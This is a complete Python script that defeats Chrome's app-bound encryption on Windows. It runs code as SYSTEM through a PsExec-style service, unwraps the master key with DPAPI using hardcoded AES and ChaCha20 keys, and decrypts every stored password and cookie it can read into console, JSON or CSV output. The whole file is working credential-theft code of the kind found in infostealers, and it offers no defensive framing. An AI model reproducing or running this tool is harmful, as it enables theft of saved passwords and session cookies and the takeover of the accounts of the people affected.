#!/usr/bin/env python3
"""
Chrome Password Extractor - Recovers passwords and cookies from Chrome browser
Requires admin privileges to access protected data
"""
import ctypes
import sys
import os
import json
import binascii
import time
import sqlite3
import pathlib
import argparse
import logging
from datetime import datetime
from typing import List, Tuple, Dict, Optional, Any

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Check for required modules
try:
    from pypsexec.client import Client
    from Crypto.Cipher import AES, ChaCha20_Poly1305
    from smbprotocol.exceptions import SMBResponseException
except ImportError as e:
    logger.error(f"Missing required module: {e}")
    logger.error("Please install required packages: pip install pypsexec pycryptodome")
    sys.exit(1)

def is_admin() -> bool:
    """Check if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        logger.error(f"Failed to check admin status: {e}")
        return False

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="Chrome Password and Cookie Extractor")
    parser.add_argument("-o", "--output", choices=["console", "json", "csv"], default="console",
                        help="Output format (default: console)")
    parser.add_argument("-f", "--file", type=str, help="Output file name (default: chrome_data_YYYY-MM-DD.ext)")
    parser.add_argument("--no-cookies", action="store_true", help="Skip cookie extraction")
    parser.add_argument("--no-passwords", action="store_true", help="Skip password extraction")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    return parser.parse_args()

def get_chrome_paths() -> Dict[str, str]:
    """Get paths to Chrome data files."""
    user_profile = os.environ.get('USERPROFILE')
    if not user_profile:
        raise EnvironmentError("Could not determine user profile directory")
    
    return {
        "local_state": os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Local State"),
        "cookies": os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
        "passwords": os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    }

def decrypt_key_with_dpapi(client: Client, encrypted_key: str) -> bytes:
    """Decrypt the Chrome encryption key using DPAPI via PSExec."""
    arguments = "-c \"" + """import win32crypt
import binascii
encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
print(binascii.b2a_base64(encrypted_key[1]).decode())
""".replace("\n", ";") + "\""

    # Step 1: Decrypt with SYSTEM DPAPI
    logger.debug("Decrypting key with SYSTEM DPAPI")
    encrypted_key_b64, stderr, rc = client.run_executable(
        sys.executable,
        arguments=arguments.format(encrypted_key),
        use_system_account=True
    )
    
    if rc != 0:
        raise RuntimeError(f"System DPAPI decryption failed with error code {rc}: {stderr.decode() if stderr else 'Unknown error'}")
    
    # Step 2: Decrypt with user DPAPI
    logger.debug("Decrypting key with user DPAPI")
    decrypted_key_b64, stderr, rc = client.run_executable(
        sys.executable,
        arguments=arguments.format(encrypted_key_b64.decode().strip()),
        use_system_account=False
    )
    
    if rc != 0:
        raise RuntimeError(f"User DPAPI decryption failed with error code {rc}: {stderr.decode() if stderr else 'Unknown error'}")
    
    # Return the relevant part of the key
    return binascii.a2b_base64(decrypted_key_b64)[-61:]

def decrypt_master_key(encrypted_key_data: bytes) -> bytes:
    """Decrypt the master key using either AES or ChaCha20."""
    # Keys from elevation_service.exe
    aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
    chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
    
    # Parse the key components
    flag = encrypted_key_data[0]
    iv = encrypted_key_data[1:1+12]
    ciphertext = encrypted_key_data[1+12:1+12+32]
    tag = encrypted_key_data[1+12+32:]
    
    try:
        if flag == 1:
            logger.debug("Using AES-GCM for key decryption")
            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
        elif flag == 2:
            logger.debug("Using ChaCha20-Poly1305 for key decryption")
            cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
        else:
            raise ValueError(f"Unsupported encryption flag: {flag}")
        
        return cipher.decrypt_and_verify(ciphertext, tag)
    except Exception as e:
        logger.error(f"Failed to decrypt master key: {e}")
        raise

def decrypt_chrome_data(encrypted_value: bytes, key: bytes) -> str:
    """Decrypt Chrome v20 encrypted data."""
    if not encrypted_value.startswith(b"v20"):
        raise ValueError("Only v20 encrypted values are supported")
    
    iv = encrypted_value[3:3+12]
    encrypted_data = encrypted_value[3+12:-16]
    tag = encrypted_value[-16:]
    
    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    decrypted_data = cipher.decrypt_and_verify(encrypted_data, tag)
    
    # For passwords, we don't need to skip bytes; for cookies, we skip 32 bytes
    if len(decrypted_data) > 32 and all(b == 0 for b in decrypted_data[:16]):
        return decrypted_data[32:].decode('utf-8')
    return decrypted_data.decode('utf-8')

def get_cookies(db_path: str, key: bytes) -> List[Dict[str, Any]]:
    """Extract and decrypt cookies from the Chrome database."""
    logger.info("Extracting cookies from database...")
    
    cookies = []
    try:
        conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        query = """
        SELECT host_key, name, path, expires_utc, is_secure, 
               is_httponly, CAST(encrypted_value AS BLOB) as encrypted_value
        FROM cookies
        """
        cursor.execute(query)
        
        for row in cursor.fetchall():
            if not row['encrypted_value'].startswith(b"v20"):
                continue
                
            try:
                decrypted_value = decrypt_chrome_data(row['encrypted_value'], key)
                cookies.append({
                    'host': row['host_key'],
                    'name': row['name'],
                    'path': row['path'],
                    'value': decrypted_value,
                    'expires': row['expires_utc'],
                    'secure': bool(row['is_secure']),
                    'httponly': bool(row['is_httponly'])
                })
            except Exception as e:
                logger.debug(f"Failed to decrypt cookie {row['name']} for {row['host_key']}: {e}")
        
        conn.close()
        logger.info(f"Successfully extracted {len(cookies)} cookies")
        return cookies
    
    except Exception as e:
        logger.error(f"Error extracting cookies: {e}")
        return []

def get_passwords(db_path: str, key: bytes) -> List[Dict[str, Any]]:
    """Extract and decrypt passwords from the Chrome database."""
    logger.info("Extracting passwords from database...")
    
    passwords = []
    try:
        conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        query = """
        SELECT origin_url, action_url, username_element, username_value, 
               password_element, CAST(password_value AS BLOB) as password_value,
               date_created, date_last_used, times_used
        FROM logins
        """
        cursor.execute(query)
        
        for row in cursor.fetchall():
            if not row['password_value'].startswith(b"v20"):
                continue
                
            try:
                decrypted_password = decrypt_chrome_data(row['password_value'], key)
                passwords.append({
                    'url': row['origin_url'],
                    'action_url': row['action_url'],
                    'username_field': row['username_element'],
                    'username': row['username_value'],
                    'password_field': row['password_element'],
                    'password': decrypted_password,
                    'created': row['date_created'],
                    'last_used': row['date_last_used'],
                    'times_used': row['times_used']
                })
            except Exception as e:
                logger.debug(f"Failed to decrypt password for {row['origin_url']}: {e}")
        
        conn.close()
        logger.info(f"Successfully extracted {len(passwords)} passwords")
        return passwords
    
    except Exception as e:
        logger.error(f"Error extracting passwords: {e}")
        return []

def format_and_save_output(cookies: List[Dict], passwords: List[Dict], output_format: str, output_file: Optional[str]):
    """Format and save the extracted data in the specified format."""
    if output_format == "console":
        # Print to console in a readable format
        if cookies:
            print("\n===== COOKIES =====")
            for i, cookie in enumerate(cookies, 1):
                print(f"\n[{i}] {cookie['host']}")
                print(f"  Name: {cookie['name']}")
                print(f"  Value: {cookie['value']}")
                print(f"  Path: {cookie['path']}")
                print(f"  Secure: {cookie['secure']}")
                print(f"  HttpOnly: {cookie['httponly']}")
        
        if passwords:
            print("\n===== PASSWORDS =====")
            for i, pwd in enumerate(passwords, 1):
                print(f"\n[{i}] {pwd['url']}")
                print(f"  Username: {pwd['username']}")
                print(f"  Password: {pwd['password']}")
                print(f"  Action URL: {pwd['action_url']}")
                if pwd['last_used']:
                    print(f"  Last Used: {datetime.fromtimestamp(pwd['last_used'] / 1000000 - 11644473600)}")
        
        return

    # Prepare filename if not provided
    if not output_file:
        timestamp = datetime.now().strftime("%Y-%m-%d")
        output_file = f"chrome_data_{timestamp}.{output_format}"
    
    data = {
        "cookies": cookies,
        "passwords": passwords,
        "extracted_at": datetime.now().isoformat()
    }
    
    try:
        if output_format == "json":
            import json
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2)
        
        elif output_format == "csv":
            import csv
            
            # Write cookies to CSV
            if cookies:
                cookies_file = f"cookies_{output_file}"
                with open(cookies_file, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(['Host', 'Name', 'Value', 'Path', 'Secure', 'HttpOnly', 'Expires'])
                    for cookie in cookies:
                        writer.writerow([
                            cookie['host'], cookie['name'], cookie['value'], 
                            cookie['path'], cookie['secure'], cookie['httponly'], cookie['expires']
                        ])
            
            # Write passwords to CSV
            if passwords:
                passwords_file = f"passwords_{output_file}"
                with open(passwords_file, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(['URL', 'Username', 'Password', 'Action URL', 'Created', 'Last Used', 'Times Used'])
                    for pwd in passwords:
                        writer.writerow([
                            pwd['url'], pwd['username'], pwd['password'], pwd['action_url'],
                            pwd['created'], pwd['last_used'], pwd['times_used']
                        ])
        
        logger.info(f"Data saved to {output_file}")
    
    except Exception as e:
        logger.error(f"Failed to save output: {e}")

def main():
    """Main function to run the Chrome data extraction process."""
    args = parse_arguments()
    
    # Set logging level based on verbosity
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    # Check for admin privileges
    if not is_admin():
        logger.error("This script requires administrator privileges.")
        logger.error("Please run this script with admin privileges and try again.")
        sys.exit(1)
    
    logger.info("Starting Chrome data extraction")
    
    try:
        paths = get_chrome_paths()
        
        # Check if Chrome data files exist
        for name, path in paths.items():
            if not os.path.exists(path):
                logger.error(f"Chrome {name} file not found at: {path}")
                logger.error("Make sure Chrome is installed and has been run at least once.")
                sys.exit(1)
        
        # Read and parse the local state file to get the encrypted key
        with open(paths["local_state"], "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
        
        # Make sure the key has the correct format
        encrypted_key_data = binascii.a2b_base64(app_bound_encrypted_key)
        if not encrypted_key_data.startswith(b"APPB"):
            raise ValueError("Invalid app_bound_encrypted_key format")
        
        # Connect to the local system
        logger.info("Connecting to local system...")
        client = Client("localhost")
        client.connect()
        
        cookies = []
        passwords = []
        
        try:
            client.create_service()
            
            # Get the encrypted key (removing APPB prefix)
            app_bound_encrypted_key_b64 = binascii.b2a_base64(encrypted_key_data[4:]).decode().strip()
            
            # Decrypt the key using DPAPI
            decrypted_key_data = decrypt_key_with_dpapi(client, app_bound_encrypted_key_b64)
            
            # Decrypt the master key
            master_key = decrypt_master_key(decrypted_key_data)
            logger.debug(f"Master key: {binascii.b2a_base64(master_key).decode().strip()}")
            
            # Extract cookies if requested
            if not args.no_cookies:
                cookies = get_cookies(paths["cookies"], master_key)
            
            # Extract passwords if requested
            if not args.no_passwords:
                passwords = get_passwords(paths["passwords"], master_key)
            
        finally:
            # Clean up service with retries
            for attempt in range(3):
                try:
                    client.remove_service()
                    break
                except SMBResponseException as e:
                    if "STATUS_CANNOT_DELETE" in str(e) and attempt < 2:
                        logger.warning(f"Failed to remove service: {e}. Retrying in 1 second...")
                        time.sleep(1)
                    else:
                        logger.error(f"Failed to remove service: {e}")
                        break
            
            client.disconnect()
        
        # Format and save the extracted data
        format_and_save_output(cookies, passwords, args.output, args.file)
        
        logger.info("Chrome data extraction completed successfully")
        
        # Give the user time to see the results if in console mode
        if args.output == "console":
            print("\nPress Enter to exit...", end="")
            input()
    
    except Exception as e:
        logger.error(f"Error during extraction: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
